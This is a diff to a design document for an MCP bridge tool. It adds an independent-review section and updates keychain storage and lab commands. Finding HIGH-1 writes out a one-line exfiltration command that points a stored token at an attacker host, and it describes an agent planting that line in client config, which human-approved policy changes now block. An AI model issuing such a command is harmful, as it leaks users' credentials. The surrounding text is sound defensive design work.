@@ -113,9 +113,10 @@ it only works on that remote.
 
 ### 5. Tokens only in the keychain
 
-`rover bridge login` stores one JSON record per bridge in the keychain
-(service `rover`, account = the bridge name): access and refresh token,
-expiry, client id, issuer, token endpoint, resource. Nothing goes to
+`rover bridge login` stores one record per bridge in the keychain
+(service `rover`, account = the bridge name): a JSON item with the access
+token, expiry, client id, issuer, token endpoint and resource, and the
+refresh token on its own under `<account>/refresh`. Nothing goes to
 ROVER_DIR, the audit log or stderr (the tests grep for the token). On
 macOS go-keyring hands the secret to `/usr/bin/security` on its stdin, not
 its argv. On Linux it needs a Secret Service on the D-Bus session bus;
@@ -148,6 +149,55 @@ to that group alone: a server or a middlebox that cannot do it makes the
 handshake fail **before any MCP byte is sent**. That is fail closed: a
 silent fallback to X25519 is exactly what a downgrade attacker wants.
 
+### 8. What the independent review found (and what changed)
+
+**A stored token could be sent to any URL (HIGH-1).** `rover bridge --name
+github --url https://attacker.example/` is a command line an agent can
+write into a client config, and the first version attached whatever token
+the keychain held under "github" to it. A bearer token is a password that
+works wherever it is presented, so that was a one-line exfiltration. Now a
+token record says which URL it was issued for (OAuth: the RFC 8707
+resource; `--token -`: the URL given at login, required), and
+`internal/bridge/oauth.Covers` lets it out only to that URL or one under
+it at a "/" boundary, same scheme, host and port (`https://a.example/mcp`
+covers `/mcp/sub`, not `/mcpx`, not `http://`, not `a.example.evil`). A
+mismatch refuses to start, naming both URLs and never the token. And a
+token is used only for a bridge that has a `bridges:` entry in
+config.yaml, a file an agent cannot change without a human approving it
+(`rover policy apply`); an unconfigured bridge runs with no credentials and
+says so. Lesson: a credential must be bound to where it may go, and the
+binding must live somewhere the attacker cannot write.
+
+**`rover uninstall` could panic on a reordered entry (HIGH-2).** The
+inverse of the install edit assumed `"command"` was immediately followed by
+`, "args": `, exactly as install wrote it. Clients rewrite their own
+config files (different spacing, members in another order), and a slice
+`orig[command.End:args.Start]` with args first is a Go panic. The inverse
+now finds each member where it is, removes `args` with one separator
+whatever the white space, and puts `url` and the original `type` back;
+round trips are tested for every layout and a fuzz target
+(`FuzzUnbridge`) checks it never panics and never edits outside the entry.
+Lesson: an inverse that depends on bytes you do not control is not an
+inverse; parse, then edit.
+
+**A tool call could overtake `notifications/initialized` (HIGH-3).** Every
+message except `initialize` was POSTed on its own goroutine, so the
+client's `notifications/initialized` and its first `tools/call` raced to
+the remote. A strict server rejects a call before the handshake is done, a
+sloppy one answers before its session is ready. Now everything that is not
+a request, and `initialize`, is sent synchronously and in order (a
+notification has no reply to wait for beyond the HTTP 202); only requests
+run concurrently. A test records arrival order at a fake remote over 50
+racing runs. Lesson: "no reply to wait for" is not "no order to keep".
+
+**Also fixed:** `MCP-Protocol-Version` on every request after `initialize`
+including GET and DELETE; `Mcp-Param-*` mirroring and the rejection of bad
+`x-mcp-header` definitions, which the 2026-07-28 revision makes a MUST
+(docs/bridge.md); and the keychain record split into two items (access
+token; `<account>/refresh`) so a rotated refresh token is never lost to
+the macOS per-item size limit, written refresh-first so a failure leaves
+the previous record readable.
+
 ## (c) Exercise it by hand
 
 The lab uses the testauth build (fake approval dialog), the fake remote and
@@ -168,7 +218,7 @@ printf '%s\n' \
 sed -i '' 's/^mode: observe$/mode: enforce/' "$ROVER_DIR/config/config.yaml"
 printf 'bridges:\n  fake:\n    url: %s\n    pq_required: true\n    ca_file: %s/ca.pem\n' "$URL" "$ROVER_DIR" >> "$ROVER_DIR/config/config.yaml"
 /tmp/rover-ta --test-auth=allow policy apply
-/tmp/rover-ta bridge login --name fake       # your browser opens; the fake AS approves at once
+/tmp/rover-ta bridge login --name fake       # your browser opens; the fake AS approves at once (the URL comes from config.yaml)
 /tmp/rover-ta --test-auth=allow daemon &
 printf '%s\n' \
   '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"manual","version":"0"}}}' \
@@ -182,7 +232,7 @@ printf '%s\n' \
 grep -o '"findings":\["tls:[^"]*"\]' "$ROVER_DIR/state/audit.jsonl" | sort | uniq -c
 /tmp/rover-ta doctor --remote | grep remote  # PASS remote fake: ... negotiated X25519MLKEM768
 grep -rl access_token "$ROVER_DIR"           # nothing: the token is only in the keychain
-security delete-generic-password -s rover -a fake; kill %1 %2
+security delete-generic-password -s rover -a fake; security delete-generic-password -s rover -a fake/refresh; kill %1 %2
 ```
 
 ### Lab: see the key_share group in Wireshark (macOS)
